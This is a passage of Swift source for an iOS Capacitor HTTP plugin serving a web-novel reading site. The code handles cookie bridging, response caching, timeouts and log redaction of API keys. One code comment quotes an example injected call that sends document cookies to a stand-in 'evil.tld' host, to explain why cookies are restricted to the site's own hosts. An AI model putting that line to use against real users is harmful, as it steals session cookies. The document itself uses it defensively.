import Foundation
import Capacitor
import WebKit

/**
 SangTacHttpPlugin — iOS stand-in for the Android build's
 `com.getcapacitor.plugin.http.Http` (which the APK patched to add X-STV-Sign).

 The site's frontend (app.v2.js / app.v2.read.js / app.v2.bookdisplay.js) calls
 `Capacitor.Plugins.Http.get({url, headers, ...})` whenever `window.Capacitor`
 exists, with headers:
   x-stv-transport: app
   x-requested-with: com.sangtacviet.mobilereader
   Cookie: document.cookie        <- incomplete: httpOnly cookies are missing

 Three things this plugin must get right on iOS:

 1. Cookies. httpOnly cookies (access / useri2 / readcontextid ...) never appear
    in `document.cookie`, so the JS-supplied Cookie header is incomplete. We
    rebuild it from WKWebsiteDataStore (which does hold httpOnly cookies).
    WKWebView and URLSession do not share cookie storage, so Set-Cookie
    responses are written back into the web view's cookie store afterwards.

 2. Response `data` typing. The Android reference implementation
    (HttpRequestHandler.readData) parses JSON *only* when the Content-Type
    contains "application/json"; every other content type yields a STRING
    (or base64 for responseType blob/arraybuffer). The site depends on that:
    app.reader.getContent2 does `r.data.replace(...)` on a response whose
    Content-Type is text/html, so an eagerly-parsed object makes the reader
    throw and never render the chapter.

 3. Referer. The site's read endpoints require a same-site Referer but the
    Capacitor call sites do not send one; we fall back to the web view's
    current URL (a browser would do the same) instead of a bare origin.

 Response shape matches @capacitor-community/http: {status, data, headers, url}.
 */
@objc(SangTacHttpPlugin)
public class SangTacHttpPlugin: CAPPlugin, CAPBridgedPlugin, WKHTTPCookieStoreObserver {

    public let identifier = "SangTacHttpPlugin"
    public let jsName = "Http"
    public let pluginMethods: [CAPPluginMethod] = [
        CAPPluginMethod(name: "get", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "post", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "put", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "patch", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "delete", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "request", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "syncCookies", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "setDiagnostics", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "startForeground", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "stopForeground", returnType: CAPPluginReturnPromise)
    ]

    /// Mirror of the Android plugin's default; only used when the site sends no
    /// User-Agent of its own.
    private static let defaultUserAgent =
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"

    /// Fallback when the caller passes no timeout. The site passes `timeout`
    /// (ms) on its domain-health probes; honouring it keeps a dead domain from
    /// blocking the reader for minutes.
    private static let defaultTimeout: TimeInterval = 60

    private let session: URLSession = {
        // Respect the server's own caching headers. The previous
        // .reloadIgnoringLocalCacheData forced every launch to refetch through
        // the native bridge whatever the site's PHP endpoints were willing to
        // let the webview reuse -- lang/zh.json, cover images, page-flip.mp3,
        // qtOnline.js -- which is a large part of "the home page still takes
        // ages after a cold start". Requests whose answer must never be stale
        // (chapter text, mutations) opt out per-request in `perform`.
        //
        // The budget is deliberately large: the site ships ~520KB of wire
        // critical-path JS/CSS plus covers, and a cache that evicts between
        // launches buys nothing. Disk is cheap here, refetching over a
        // 300-900ms-TTFB link is not.
        URLCache.shared = URLCache(memoryCapacity: 64 * 1024 * 1024,
                                   diskCapacity: 512 * 1024 * 1024,
                                   diskPath: nil)
        let config = URLSessionConfiguration.default
        config.requestCachePolicy = .useProtocolCachePolicy
        config.urlCache = URLCache.shared
        config.timeoutIntervalForRequest = 60
        config.timeoutIntervalForResource = 120
        config.httpCookieAcceptPolicy = .always
        config.httpShouldSetCookies = true
        return URLSession(configuration: config)
    }()

    /// Endpoints whose response must be fetched fresh every time: chapter bodies
    /// (the site already keeps its own offline copy) and anything that mutates
    /// server state.
    private static func mustRevalidate(_ url: URL) -> Bool {
        let text = url.absoluteString
        return text.contains("sajax=readchapter")
            || text.contains("jsonify.php")
            || text.contains("bookmanage.php")
    }

    /// Chapter bodies are the expensive response (`mustRevalidate` forces a
    /// network fetch) and immutable published text. The site keeps its own offline
    /// copy of the same content, so a cached answer cannot go stale in a way that
    /// matters. The other reusable answer -- a book's chapter list -- is decided
    /// in `cachePolicy` below.
    private static func isChapterRequest(_ url: URL) -> Bool {
        return url.absoluteString.contains("sajax=readchapter")
    }

    /// Below this a body cannot be a chapter -- it is the site's own failure JSON.
    private static let minCacheableChapterBytes = 4096

    /**
     A real chapter body is tens of KB of JSON text. Two things must both hold
     before one is worth keeping:

       * It has to be big enough to be a chapter. The site's failure answers are a
         few dozen bytes (`{"code": 7,"time": 1000}`) and caching one would make
         the failure stick.
       * It has to be the site's own answer at all. `sajax=readchapter` replies
         with JSON under a `Content-Type: text/html` header (docs/capacitor-port.md:112)
         and `app.reader.getContent2` runs `JSON.parse` on it
         (app.v2.read.js:582) -- so a body that is not JSON means the reader is
         already broken (a Cloudflare interstitial, a login page, a proxy error)
         and caching it would make that stick for the whole session. The two
         failure codes the device logs record -- `7` for a mirror that cannot
         serve reads, `10002` for a timeout -- are excluded for the same reason.

     The failure mode is the safe direction: anything unrecognised is simply
     fetched again.
     */
    private static func isCacheableChapter(_ body: Data) -> Bool {
        guard body.count >= minCacheableChapterBytes else { return false }
        var data = body
        // JSONSerialization tolerates a UTF-8 BOM, but the site's own reader
        // strips one explicitly (app.v2.read.js:577), so match that.
        if data.count >= 3, data[data.startIndex] == 0xEF,
           data[data.startIndex + 1] == 0xBB, data[data.startIndex + 2] == 0xBF {
            data = Data(data.dropFirst(3))
        }
        guard let parsed = try? JSONSerialization.jsonObject(with: data,
                                                             options: [.fragmentsAllowed]),
              let object = parsed as? [String: Any],
              let code = object["code"] else {
            return false
        }
        // Numeric form via NSNumber: `String(describing:)` would render a JSON
        // `7.0` as "7.0" and let it through the comparison below.
        if let number = code as? NSNumber {
            let value = number.intValue
            return value != 7 && value != 10002
        }
        let text = String(describing: code)
        return text != "7" && text != "10002"
    }

    /// Which answers may be reused, and for how long, decided from the request
    /// alone. One function so the lookup and the store can never disagree.
    ///
    ///   * a chapter body -- immutable published text, kept for the whole session;
    ///   * a book's chapter list -- 115 KB of JSON that the 2026-09-23 device log
    ///     shows fetched three times in one launch (entering the list, opening the
    ///     reader, walking back out: 1484 + 1162 + 828 ms), while it only changes
    ///     when the author publishes.
    ///
    /// Nothing else. The user-state endpoints (`userinfo.php`, the
    /// `booklist.php?method=*` tabs) are deliberately left alone: their answers
    /// carry unread counts and follow state, and a stale one is a wrong screen
    /// rather than a saved round trip.
    private struct CachePolicy {
        /// `nil` keeps the entry for the session, which is what an immutable
        /// chapter body wants. A list can go stale, so it carries a clock.
        let ttl: TimeInterval?
        let accepts: (Data) -> Bool
    }

    /// Longer than the 60 s the device log shows between the first and last copy
    /// of the same list, and short enough that a chapter published while the
    /// reader is open cannot hide behind it for a session.
    private static let chapterListTTL: TimeInterval = 300

    /// `GET` only: the cache key carries the method and the URL but no request
    /// body, so a POST must never be answered from here.
    private static func isChapterListRequest(_ method: String, _ url: URL) -> Bool {
        guard method.caseInsensitiveCompare("GET") == .orderedSame else { return false }
        return url.absoluteString.contains("sajax=getchapterlist")
    }

    /**
     The chapter list's own signature: `{"code":1,"data":"1-/-<id>-/-<name>-/-/-…"}`.

     `code == 1` *and* a string `data` carrying the site's own `-/-` separator must
     both hold. That is what keeps an error page, a Cloudflare interstitial or the
     site's own `{"code":400}` out of the cache -- and the failure direction is the
     one that matters, because a cached failure would persist for the whole TTL.
     */
    private static func isCacheableChapterList(_ body: Data) -> Bool {
        var data = body
        if data.count >= 3, data[data.startIndex] == 0xEF,
           data[data.startIndex + 1] == 0xBB, data[data.startIndex + 2] == 0xBF {
            data = Data(data.dropFirst(3))
        }
        guard let parsed = try? JSONSerialization.jsonObject(with: data,
                                                             options: [.fragmentsAllowed]),
              let object = parsed as? [String: Any],
              let code = object["code"] as? NSNumber, code.intValue == 1,
              let list = object["data"] as? String,
              list.contains("-/-") else {
            return false
        }
        return true
    }

    private static func cachePolicy(method: String, url: URL) -> CachePolicy? {
        if isChapterRequest(url) {
            return CachePolicy(ttl: nil, accepts: isCacheableChapter)
        }
        if isChapterListRequest(method, url) {
            return CachePolicy(ttl: chapterListTTL, accepts: isCacheableChapterList)
        }
        return nil
    }

    /// Session-scoped LRU for reusable answers. Bounded by both entry count and
    /// total bytes, evicting least-recently-used first. Deliberately in memory:
    /// an app restart starts clean, which bounds the memory and removes any
    /// question about serving an answer from a previous version of the app.
    private final class ResponseCache {
        struct Entry {
            let status: Int
            let contentType: String
            let headers: [String: String]
            let body: Data
            /// `nil` = valid until the app exits.
            let expiresAt: Date?
        }

        private let lock = NSLock()
        private var entries: [String: Entry] = [:]
        private var order: [String] = []
        private var bytes = 0
        private let maxEntries: Int
        private let maxBytes: Int

        init(maxEntries: Int, maxBytes: Int) {
            self.maxEntries = maxEntries
            self.maxBytes = maxBytes
        }

        func get(_ key: String) -> Entry? {
            lock.lock()
            defer { lock.unlock() }
            guard let entry = entries[key] else { return nil }
            if let expiresAt = entry.expiresAt, expiresAt <= Date() {
                // Dropped here rather than on the next sweep, so the byte budget
                // is freed the moment the answer stops being useful.
                entries.removeValue(forKey: key)
                if let index = order.firstIndex(of: key) { order.remove(at: index) }
                bytes -= entry.body.count
                return nil
            }
            if let index = order.firstIndex(of: key) {
                order.remove(at: index)
                order.append(key)
            }
            return entry
        }

        func set(_ key: String, _ entry: Entry) {
            lock.lock()
            defer { lock.unlock() }
            if let existing = entries[key] {
                bytes -= existing.body.count
                if let index = order.firstIndex(of: key) { order.remove(at: index) }
            }
            entries[key] = entry
            order.append(key)
            bytes += entry.body.count
            while (entries.count > maxEntries || bytes > maxBytes), let oldest = order.first {
                order.removeFirst()
                if let removed = entries.removeValue(forKey: oldest) {
                    bytes -= removed.body.count
                }
            }
        }
    }

    /// Chapter bodies are tens of KB each and a chapter list is ~115 KB; 300
    /// entries is far more than a reading session touches, and the byte cap is
    /// what actually bounds the footprint (kept well under the 64MB URLCache so
    /// the two budgets together stay modest on a 3GB device).
    private let responseCache = ResponseCache(maxEntries: 300,
                                              maxBytes: 64 * 1024 * 1024)

    // MARK: - Request policy

    /**
     Hosts whose requests are allowed to carry the web view's cookies.

     The page can call this plugin with any URL, and the plugin answers with the
     session cookies attached. That is the whole point (the site's session is
     httpOnly, so the page cannot build that header itself), but it also means a
     single line of injected script could ask us to deliver the session to a
     host of its choosing. Cookies are therefore attached only when the target
     is one of these; everything else still works, it just travels anonymous --
     which keeps the user-configurable translation endpoint (设置 -> 自定义接口
     地址) usable without opening the cookie surface to the whole internet.
     */
    private static let cookieHosts = [
        "sangtacviet.com",
        "sangtacviet.vip",
        "sangtacviet.app",
        "stv-appdomain-00000001.org"
    ]

    /// Hosts the app itself talks to for translation. Listed so the diagnostic
    /// panel can name them; they are not trusted with cookies (they have none).
    private static let knownApiHosts = [
        "translation.googleapis.com",
        "api.cognitive.microsofttranslator.com",
        "api-free.deepl.com",
        "api.deepl.com",
        "api.openai.com",
        "edge.microsoft.com"
    ]

    private static func hostMatches(_ host: String, _ suffix: String) -> Bool {
        return host == suffix || host.hasSuffix("." + suffix)
    }

    private static func allowsCookies(_ url: URL) -> Bool {
        guard let host = url.host?.lowercased(), !host.isEmpty else { return false }
        return cookieHosts.contains { hostMatches(host, $0) }
    }

    private static func isKnownHost(_ url: URL) -> Bool {
        guard let host = url.host?.lowercased() else { return false }
        return cookieHosts.contains { hostMatches(host, $0) }
            || knownApiHosts.contains { hostMatches(host, $0) }
    }

    /// Hosts already reported, so a request to a user-configured endpoint does
    /// not repeat the line on every call.
    private let foreignHostLock = NSLock()
    private var warnedForeignHosts: Set<String> = []

    /// One line per host the first time a request goes out without cookies.
    ///
    /// The cookie host list is hard-coded, and the site's mirrors are hard-coded
    /// in its own JS too (`defaultDomains`, app.v2.js:932 / :1035) with a
    /// rotatable-looking `stv-appdomain-00000001.org` suffix. If the site ever
    /// adds a second mirror, requests to it would succeed but arrive anonymous,
    /// which on device looks like "randomly logged out" or "code 7" rather than
    /// like a policy decision. This makes that visible.
    private func warnForeignHost(_ url: URL) {
        guard !SangTacHttpPlugin.isKnownHost(url) else { return }
        let host = url.host?.lowercased() ?? ""
        foreignHostLock.lock()
        let isNew = warnedForeignHosts.insert(host).inserted
        foreignHostLock.unlock()
        guard isNew else { return }
        callLog("policy", "no cookies sent to \(host): not a site host")
    }

    // MARK: - Log redaction

    /**
     Everything this plugin logs is reachable by the user: the in-page panel has
     a COPY button and CAPLog lines are readable from Console.app. The Google
     engine used to put the user's API key in the query string, so a `key=`
     parameter would land in that panel verbatim. Redact before logging, never
     after.

     Three shapes, and they must not overlap: a query parameter, a JSON field
     (the quoted form, which is how a body echoes a header), and a raw header
     line (the unquoted form). The quoted names are listed in the JSON pattern
     rather than left to the header pattern, so `"Authorization": "Bearer x"`
     becomes `"Authorization": "***"` instead of a half-rewritten line.
     */
    private static let redactionPatterns: [NSRegularExpression] = {
        let query = "([?&](?:key|api[-_]?key|access_?token|subscription[-_]?key|token|password|secret|signature|sig)=)[^&#\\s]*"
        let json = "(\"(?:key|api[-_]?key|access_?token|subscription[-_]?key|token|password|secret|signature|authorization|ocp-apim-subscription-key|x-goog-api-key)\"\\s*:\\s*)(\"[^\"]*\"|[^,}\\s]+)"
        let header = "((?:ocp-apim-subscription-key|authorization|x-goog-api-key)\\s*:\\s*)[^\\r\\n]*"
        return [query, json, header].compactMap {
            try? NSRegularExpression(pattern: $0, options: [.caseInsensitive])
        }
    }()

    static func redact(_ text: String) -> String {
        var out = text
        for regex in redactionPatterns {
            let range = NSRange(out.startIndex..<out.endIndex, in: out)
            out = regex.stringByReplacingMatches(in: out, options: [], range: range,
                                                 withTemplate: "$1***")
        }
        return out
    }

    // MARK: - Cookie snapshot

    /**
     `getAllCookies` is an asynchronous hop to the main thread plus a walk of
     every cookie on the device, and the book list fires dozens of requests at
     once -- so the old code paid that per request, on the critical path.

     Instead we keep a snapshot, refreshed by `WKHTTPCookieStoreObserver`
     (which fires for server Set-Cookie, page `document.cookie` writes and our
     own writes alike) and updated synchronously whenever *we* store a
     response's cookies, so a login round trip is never one request behind.

     The fallback matters: until the first snapshot lands, a request goes
     through the old asynchronous read rather than being served an empty
     cookie jar.
     */
    private let cookieLock = NSLock()
    private var cookieSnapshot: [HTTPCookie] = []
    private var cookieSnapshotReady = false
    private var snapshotRefreshScheduled = false
    /// Bumped by every `mergeSnapshot`. A full store read captures this before it
    /// is issued and drops its answer if a merge landed meanwhile: otherwise a
    /// read that started before a Set-Cookie could finish after it and replace
    /// the snapshot with one that predates that cookie -- and since the request
    /// path prefers the snapshot once it is warm, that would send the next few
    /// requests out without the session cookie they just received.
    private var snapshotGeneration = 0

    private func currentGeneration() -> Int {
        cookieLock.lock()
        defer { cookieLock.unlock() }
        return snapshotGeneration
    }

    private func setSnapshot(_ cookies: [HTTPCookie], issuedAt generation: Int) {
        cookieLock.lock()
        let stale = generation != snapshotGeneration
        if !stale {
            cookieSnapshot = cookies
            cookieSnapshotReady = true
        }
        cookieLock.unlock()
        // A read that lost its race is retried rather than simply dropped. It has
        // to be dropped -- applying it could erase a cookie merged while it was in
        // flight -- but leaving it at that keeps the snapshot cold, which sends
        // every later request back through the full store walk this snapshot
        // exists to remove. In a quiet window the retry lands and the snapshot
        // goes warm.
        if stale { scheduleSnapshotRefresh() }
    }

    /// Merges cookies we just received into the snapshot so the next request
    /// sees them immediately, without waiting for the observer to fire.
    private func mergeSnapshot(_ incoming: [HTTPCookie]) {
        cookieLock.lock()
        var merged = cookieSnapshot
        for cookie in incoming {
            merged.removeAll { existing in
                existing.name == cookie.name
                    && existing.domain == cookie.domain
                    && existing.path == cookie.path
            }
            merged.append(cookie)
        }
        cookieSnapshot = merged
        // Deliberately does NOT mark the snapshot warm. From a cold start this
        // holds only the cookies of one response, and promoting that to
        // "authoritative" would send the next few requests out without the
        // httpOnly session cookies until the observer's full read lands. Only
        // `setSnapshot` -- which comes from a complete `getAllCookies` -- marks it
        // ready; until then the async fallback runs.
        snapshotGeneration += 1
        cookieLock.unlock()
    }

    /// `nil` means "no snapshot yet -- use the asynchronous store read".
    private func snapshotCookies(for url: URL?) -> [HTTPCookie]? {
        cookieLock.lock()
        defer { cookieLock.unlock() }
        guard cookieSnapshotReady else { return nil }
        guard let url = url else { return cookieSnapshot }
        return SangTacHttpPlugin.matching(cookieSnapshot, host: url.host ?? "")
    }

    /// Coalesced: the site writes `transmode` / `foreignlang` immediately before
    /// every chapter read, and a full cookie-store walk per write would hand back
    /// much of the cost the snapshot exists to remove. At most one refresh per
    /// runloop turn, and a change that lands while a refresh is in flight
    /// schedules the next one.
    /// One coalesced full read of the cookie store: at most one per runloop turn,
    /// and a change that lands while a refresh is in flight schedules the next
    /// one. Coalescing matters because the site writes `transmode` /
    /// `foreignlang` immediately before every chapter read, and a full store walk
    /// per write would hand back much of the cost the snapshot exists to remove.
    ///
    /// Also the retry path for a read that lost its race (see `setSnapshot`).
    private func scheduleSnapshotRefresh() {
        cookieLock.lock()
        let alreadyScheduled = snapshotRefreshScheduled
        snapshotRefreshScheduled = true
        cookieLock.unlock()
        guard !alreadyScheduled else { return }
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            self.cookieLock.lock()
            self.snapshotRefreshScheduled = false
            self.cookieLock.unlock()
            let generation = self.currentGeneration()
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { [weak self] cookies in
                self?.setSnapshot(cookies, issuedAt: generation)
            }
        }
    }

    public func cookiesDidChange(in cookieStore: WKHTTPCookieStore) {
        scheduleSnapshotRefresh()
    }

    // MARK: - Diagnostics switch

    /// Off unless the in-page panel asks for it. Every diagnostic line used to
    /// be built and shipped across the bridge on every request even with the
    /// panel closed: `preview()` decoded the whole response body and
    /// `evaluateJavaScript` is a cross-process call. Round 14 turned the JS side
    /// off; this turns the native side off too.
    private let diagLock = NSLock()
    private var diagnosticsEnabled = false

    private var diagnosticsOn: Bool {
        diagLock.lock()
        defer { diagLock.unlock() }
        return diagnosticsEnabled
    }

    private func setDiagnosticsEnabled(_ on: Bool) {
        diagLock.lock()
        diagnosticsEnabled = on
        diagLock.unlock()
    }

    // MARK: - Bridged methods

    override public func load() {
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            // Both the store and this plugin live for the process lifetime, so
            // the observer is never removed. (Capacitor's own cookie manager
            // registers a temporary observer and relies on it surviving, which
            // only makes sense if the store retains observers.)
            let store = WKWebsiteDataStore.default().httpCookieStore
            store.add(self)
            let generation = self.currentGeneration()
            store.getAllCookies { [weak self] cookies in
                self?.setSnapshot(cookies, issuedAt: generation)
            }
        }
    }

    /// Called by the `diag` site patch whenever the logging switch changes, so
    /// the native hot path stops paying for lines nobody will read.
    @objc func setDiagnostics(_ call: CAPPluginCall) {
        var on = false
        if let raw = call.options["enabled"], !(raw is NSNull) {
            if let number = raw as? NSNumber { on = number.boolValue }
            else if let text = raw as? String { on = (text == "true" || text == "1") }
        }
        setDiagnosticsEnabled(on)
        call.resolve(["enabled": on])
    }

    @objc func get(_ call: CAPPluginCall) { perform("GET", call) }
    @objc func post(_ call: CAPPluginCall) { perform("POST", call) }
    @objc func put(_ call: CAPPluginCall) { perform("PUT", call) }
    @objc func patch(_ call: CAPPluginCall) { perform("PATCH", call) }
    @objc func delete(_ call: CAPPluginCall) { perform("DELETE", call) }

    @objc func request(_ call: CAPPluginCall) {
        let method = (call.getString("method") ?? "GET").uppercased()
        perform(method, call)
    }

    /// Kept for parity with the Android build's patched App plugin: cookies are
    /// already bridged on every request, so this is a no-op acknowledgement.
    @objc func syncCookies(_ call: CAPPluginCall) {
        nativeCookies(for: nil) { [weak self] cookies in
            self?.callLog("syncCookies", "bridged \(cookies.count) cookie(s)")
            call.resolve(["value": true, "count": cookies.count])
        }
    }

    /**
     The Android build's Http plugin carries the read-aloud foreground service.
     iOS keeps playing while the app is foregrounded and there is nothing to
     start, but app.v2.read.js calls these through
     `Capacitor.nativePromise("Http", ...)` without a catch, so an unregistered
     method would surface as an unhandled rejection in the diagnostic panel.
     */
    @objc func startForeground(_ call: CAPPluginCall) {
        call.resolve(["value": true])
    }

    @objc func stopForeground(_ call: CAPPluginCall) {
        call.resolve(["value": true])
    }

    // MARK: - Core request path

    private func perform(_ method: String, _ call: CAPPluginCall) {
        // Wall-clock cost of everything this plugin owns: cookie-store read,
        // request build, network round trip. The site's own book-list/reader
        // calls were reported as "very slow"; without this number there is no
        // way to tell a slow server from slow JS in the web view.
        let started = Date()
        func elapsedMs() -> Int { Int(Date().timeIntervalSince(started) * 1000) }

        guard var urlString = call.getString("url"), !urlString.isEmpty else {
            call.reject("Missing 'url'")
            return
        }

        if let params = call.getObject("params"), !params.isEmpty {
            urlString = SangTacHttpPlugin.appendingQuery(params, to: urlString)
        }
        guard let url = URL(string: urlString) else {
            // Redacted: the URL is what carries a `?key=`, and a reject message
            // reaches both the page and Capacitor's own os_log.
            call.reject("Invalid URL: \(SangTacHttpPlugin.redact(urlString))")
            return
        }

        var headers: [String: String] = [:]
        if let raw = call.getObject("headers") {
            for (key, value) in raw where !(value is NSNull) {
                headers[key] = String(describing: value)
            }
        }

        // A page script can pass any Cookie header it likes, and it can aim the
        // request anywhere. Cookies -- ours and the ones the caller supplied --
        // only travel to the site's own hosts, so an injected
        // `Http.get({url: 'https://evil.tld', headers: {Cookie: document.cookie}})`
        // arrives empty. The request itself still goes through, which is what
        // keeps a user-configured translation endpoint working.
        let cookieAllowed = SangTacHttpPlugin.allowsCookies(url)
        if !cookieAllowed {
            // Snapshot the names first: removing from a dictionary while
            // iterating its own `keys` view is undefined.
            let cookieNames = headers.keys.filter { $0.lowercased() == "cookie" }
            for key in cookieNames {
                headers.removeValue(forKey: key)
            }
            // Once per host, so a rotated mirror that silently loses its session
            // is visible instead of looking like a random "logged out".
            warnForeignHost(url)
        }

        let jsCookieHeader = cookieAllowed
            ? headers.first { $0.key.lowercased() == "cookie" }?.value
            : nil

        let timeout = SangTacHttpPlugin.timeoutSeconds(from: call)
        // Resolve the Referer fallback here, on the calling (main) thread, so we
        // never touch bridge.webView from a cookie-store callback queue.
        let refererFallback = pageReferer(for: url)

        nativeCookies(for: url, allowed: cookieAllowed) { [weak self] cookies in
            guard let self = self else { return }

            if !cookies.isEmpty {
                headers["Cookie"] = SangTacHttpPlugin.mergeCookieHeader(
                    jsHeader: jsCookieHeader, nativeCookies: cookies)
            }
            // Implicit browser headers the site relies on (the read endpoints
            // require a same-site Referer; URLSession does not add one).
            if headers["Referer"] == nil, headers["referer"] == nil, !refererFallback.isEmpty {
                headers["Referer"] = refererFallback
            }
            if headers["User-Agent"] == nil, headers["user-agent"] == nil {
                headers["User-Agent"] = SangTacHttpPlugin.defaultUserAgent
            }

            // Answers we already have are served from the session cache, so a
            // re-read costs no network at all.
            //
            // The key is built HERE, from the Cookie header that is *about to be
            // sent*, not from that header's two sources separately. They can
            // disagree -- the native snapshot lags the page's own
            // `document.cookie` writes, and for httpOnly names the page's header
            // has no value at all -- and a key derived from them independently
            // would describe a request that was never sent, then serve a chapter
            // in the language the reader had already moved away from.
            var cacheKey: String?
            var responsePolicy: CachePolicy?
            if let policy = SangTacHttpPlugin.cachePolicy(method: method, url: url) {
                // The method is part of the identity too: a GET and a POST to the
                // same URL are not the same answer. Not reachable today (the
                // downloader uses `&download=true`, a different URL), but it costs
                // nothing to be right.
                let key = method + "|" + url.absoluteString + "|"
                    + SangTacHttpPlugin.chapterVariant(headers["Cookie"])
                cacheKey = key
                responsePolicy = policy
                if let cached = self.responseCache.get(key) {
                    self.serveCached(cached, url: url, call: call, method: method,
                                     elapsedMs: elapsedMs())
                    return
                }
            }

            // Build the body first: it may contribute a Content-Type header.
            let body = self.bodyData(for: call, headers: &headers)

            var request = URLRequest(url: url)
            request.httpMethod = method
            request.timeoutInterval = timeout
            if SangTacHttpPlugin.mustRevalidate(url) {
                request.cachePolicy = .reloadIgnoringLocalCacheData
            }
            for (key, value) in headers {
                request.setValue(value, forHTTPHeaderField: key)
            }
            if let body = body {
                request.httpBody = body
            }

            self.session.dataTask(with: request) { data, response, error in
                if let error = error {
                    // The localized description can embed the URL, so it is
                    // redacted before it reaches the page or Capacitor's log.
                    let message = SangTacHttpPlugin.redact(error.localizedDescription)
                    self.callLog("err", "\(method) \(url.absoluteString) -> \(message)")
                    self.report("ERR", "\(method) \(url.absoluteString) FAILED in "
                        + "\(elapsedMs())ms: \(message)", force: true)
                    call.reject(message, nil, error)
                    return
                }
                guard let http = response as? HTTPURLResponse else {
                    self.report("ERR", "\(method) \(url.absoluteString) no HTTP response",
                                force: true)
                    call.reject("No HTTP response")
                    return
                }

                self.storeResponseCookies(http, for: url)

                let body = data ?? Data()
                let contentType = (http.value(forHTTPHeaderField: "Content-Type") ?? "").lowercased()
                let headerMap = http.allHeaderFields.reduce(into: [String: String]()) { acc, pair in
                    if let key = pair.key as? String { acc[key] = String(describing: pair.value) }
                }

                let payload = SangTacHttpPlugin.responsePayload(
                    body: body,
                    contentType: contentType,
                    responseType: call.getString("responseType"))

                var result: [String: Any] = [
                    "status": http.statusCode,
                    "headers": headerMap,
                    "url": http.url?.absoluteString ?? url.absoluteString,
                    "data": payload.value
                ]
                if http.statusCode >= 400 {
                    result["error"] = true
                }

                // Keep the answer for the next time it is asked for. The policy's
                // own `accepts` is what decides -- a chapter has to be 2xx, big
                // enough and actually the site's JSON rather than a challenge page
                // that happens to be large; a chapter list additionally has to
                // carry `code:1` and the site's own `-/-` record separator.
                if let key = cacheKey, let policy = responsePolicy,
                   http.statusCode >= 200, http.statusCode < 300, policy.accepts(body) {
                    let expiresAt = policy.ttl.map { Date().addingTimeInterval($0) }
                    let lifetime = policy.ttl.map { "\(Int($0))s" } ?? "the session"
                    self.responseCache.set(key, ResponseCache.Entry(status: http.statusCode,
                                                                    contentType: contentType,
                                                                    headers: headerMap,
                                                                    body: body,
                                                                    expiresAt: expiresAt))
                    // Kept out of the panel (it fires on every cached answer) but
                    // written to the native call log, which is the only place that
                    // shows what the session cache actually decided to hold.
                    self.callLog("ok", "\(method) \(url.absoluteString) cached-for "
                        + lifetime + " (\(body.count)b)")
                }

                self.callLog(http.statusCode >= 400 ? "err" : "ok",
                             "\(method) \(url.absoluteString) -> \(http.statusCode) bytes=\(body.count) data=\(payload.kind)")
                // Only failures reach the panel while logging is off: the preview
                // decodes the response body and every report is a cross-process
                // call, and paying that for a 200 on every request in a list page
                // is exactly the waste this gate exists to remove. The check sits
                // outside the string build so `preview()` is never even called.
                //
                // A 4xx counts as a failure too: an expired session answers 401/403
                // and "the request failed" is exactly what a bug report needs.
                let isFailure = http.statusCode >= 400
                if isFailure || self.diagnosticsOn {
                    self.report(isFailure ? "ERR" : "Http",
                                "\(method) \(url.absoluteString) -> \(http.statusCode) "
                        + "\(contentType.isEmpty ? "no-content-type" : contentType) "
                        + "\(payload.kind) \(body.count)b in \(elapsedMs())ms "
                        + SangTacHttpPlugin.preview(payload: payload, body: body),
                                force: isFailure)
                }
                call.resolve(result)
            }.resume()
        }
    }

    // MARK: - Response payload (Android parity)

    private struct Payload {
        let value: Any
        let kind: String
    }

    /**
     Mirrors com.getcapacitor.plugin.util.HttpRequestHandler.readData:
       - Content-Type contains "application/json" -> parsed JSON
       - otherwise responseType blob/arraybuffer    -> base64 string
       - otherwise responseType json                -> parsed JSON
       - otherwise                                  -> raw string
     The site's app.reader.getContent2 calls `r.data.replace(...)` on a
     text/html response, so this branch is load-bearing for chapter reading.
     */
    private static func responsePayload(body: Data, contentType: String, responseType: String?) -> Payload {
        let isJSONMime = contentType.contains("application/json")
            || contentType.contains("application/vnd.api+json")
        let requested = (responseType ?? "text").lowercased()

        if isJSONMime || requested == "json" {
            if let parsed = parseJSON(body) { return Payload(value: parsed, kind: "json") }
            return Payload(value: String(data: body, encoding: .utf8) ?? "",
                           kind: "string(unparsed-json)")
        }

        if requested == "arraybuffer" || requested == "blob" {
            // Binary: covers, page-flip.mp3, TTS WAV. Decoding this as UTF-8
            // produced a string that was immediately discarded -- on every
            // image the book list loaded.
            return Payload(value: body.base64EncodedString(), kind: "base64")
        }

        return Payload(value: String(data: body, encoding: .utf8) ?? "", kind: "string")
    }

    private static func parseJSON(_ data: Data) -> Any? {
        if data.isEmpty { return "" }
        return try? JSONSerialization.jsonObject(with: data, options: [.fragmentsAllowed])
    }

    // MARK: - Timeout

    /// The site passes `timeout` (ms) on its /warp.php probes; the Capacitor
    /// plugin API also has connectTimeout / readTimeout. Accept all three.
    /// Read the raw option rather than relying on a typed accessor so a
    /// non-numeric value can never trap.
    private static func timeoutSeconds(from call: CAPPluginCall) -> TimeInterval {
        for key in ["timeout", "readTimeout", "connectTimeout"] {
            guard let raw = call.options[key], !(raw is NSNull) else { continue }
            let ms: Double?
            if let number = raw as? NSNumber {
                ms = number.doubleValue
            } else if let text = raw as? String {
                ms = Double(text)
            } else {
                ms = nil
            }
            if let ms = ms, ms > 0 {
                return max(ms / 1000.0, 1.0)
            }
        }
        return defaultTimeout
    }

    // MARK: - Body

    private func bodyData(for call: CAPPluginCall, headers: inout [String: String]) -> Data? {
        // Read the raw bridged value rather than JSValue so both string and
        // JSON-object bodies are handled uniformly.
        guard let data = call.options["data"], !(data is NSNull) else { return nil }

        if let text = data as? String {
            if headers["Content-Type"] == nil, headers["content-type"] == nil {
                headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
            }
            return text.data(using: .utf8)
        }

        if JSONSerialization.isValidJSONObject(data),
